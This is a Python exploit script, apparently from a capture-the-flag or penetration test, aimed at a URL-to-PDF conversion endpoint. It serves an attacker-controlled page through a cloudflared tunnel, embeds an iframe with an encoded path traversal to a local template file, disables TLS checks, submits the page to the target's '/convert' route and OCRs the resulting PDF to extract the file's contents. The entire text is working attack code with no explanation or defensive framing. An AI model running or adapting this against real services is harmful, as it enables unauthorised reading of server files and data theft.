import http.server,threading,subprocess,re,time,os,ssl,urllib.request,urllib.parse,urllib.error
TARGET=os.environ['TARGET'].rstrip('/');PORT=8765;ORIGIN=''
TRAV='/%2e%2e/%2e%2e/%2e%2e/%2e%2e/app/app/templates/index.html'
class H(http.server.BaseHTTPRequestHandler):
 def log_message(self,fmt,*args):print('HTTPLOG',fmt%args,flush=True)
 def sendb(self,b):self.send_response(200);self.send_header('Content-Type','text/html; charset=utf-8');self.send_header('Content-Length',str(len(b)));self.send_header('Cache-Control','no-store');self.end_headers();self.wfile.write(b)
 def do_GET(self):
  global ORIGIN
  print('GETPATH',repr(self.path),flush=True)
  if urllib.parse.urlsplit(self.path).path=='/probe':
   src=ORIGIN+TRAV;b=(f'<!doctype html><h1>DEPTH4_LOCAL_TEMPLATE</h1><iframe style="border:2px solid black;width:900px;height:700px;transform:scale(1.4);transform-origin:0 0" width=900 height=700 src="{src}"></iframe>').encode();return self.sendb(b)
  return self.sendb(b'<!doctype html><h2>NETWORK_FALLBACK_SHOULD_NOT_BE_USED</h2>')
ctx=ssl.create_default_context();ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE
opener=urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
def get(u,t=20):
 with opener.open(urllib.request.Request(u,headers={'User-Agent':'DFO-LFI'}),timeout=t) as r:return r.status,dict(r.headers),r.read()
srv=http.server.ThreadingHTTPServer(('127.0.0.1',PORT),H);threading.Thread(target=srv.serve_forever,daemon=True).start();cf=subprocess.Popen(['/tmp/cloudflared','tunnel','--url',f'http://127.0.0.1:{PORT}','--no-autoupdate','--protocol','http2'],stdout=subprocess.PIPE,stderr=subprocess.STDOUT,text=True,bufsize=1)
while True:
 line=cf.stdout.readline();print('CF',line.rstrip(),flush=True);m=re.search(r'https://[a-z0-9-]+\.trycloudflare\.com',line,re.I)
 if m:ORIGIN=m.group();break
for i in range(25):
 try:
  st,h,b=get(ORIGIN+'/ready',10);print('READY',st,len(b),flush=True);break
 except Exception as e:print('RETRY',repr(e),flush=True);time.sleep(2)
data=urllib.parse.urlencode({'url':ORIGIN+'/probe?x='+str(time.time_ns())}).encode();req=urllib.request.Request(TARGET+'/convert',data=data,headers={'Content-Type':'application/x-www-form-urlencoded'})
try:
 with opener.open(req,timeout=60) as r:body=r.read();print('CONVERT',r.status,len(body),flush=True)
except urllib.error.HTTPError as e:body=e.read();print('CONVERT_ERR',e.code,len(body),repr(body[:1000]),flush=True)
open('/tmp/lfi.pdf','wb').write(body)
if body.startswith(b'%PDF'):
 subprocess.run(['pdftoppm','-f','1','-singlefile','-r','500','-png','/tmp/lfi.pdf','/tmp/lfi'],check=True)
 for psm in ('6','11','3'):
  out=subprocess.check_output(['tesseract','/tmp/lfi.png','stdout','--psm',psm],stderr=subprocess.DEVNULL);print('OCR',psm,repr(out[:4000]),flush=True)
